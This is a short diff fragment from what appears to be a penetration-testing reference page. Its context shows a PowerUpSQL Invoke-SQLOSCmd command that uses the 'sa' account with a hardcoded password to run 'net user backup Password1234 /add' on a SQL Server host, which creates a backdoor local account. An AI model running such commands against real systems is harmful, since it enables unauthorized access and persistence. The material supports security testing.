@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:45.393785+00:00'
 ```bash
 PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add'" -Verbose
 ```
+
+
